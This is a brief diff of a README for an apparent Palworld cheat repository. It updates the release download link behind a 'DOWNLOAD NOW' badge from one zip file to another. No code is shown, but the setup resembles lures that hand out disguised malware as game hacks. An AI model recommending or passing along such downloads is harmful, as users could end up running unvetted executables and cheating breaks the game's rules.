@@ -29,10 +29,11 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/BrightStokerHum/Palworld-Extreme-Hack/releases/download/4/PalworldExtreme.zip">
+  <a href="https://github.com/BrightStokerHum/Palworld-Extreme-Hack/releases/download/4/PalworldExtreme2.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
+
 
 ---
 
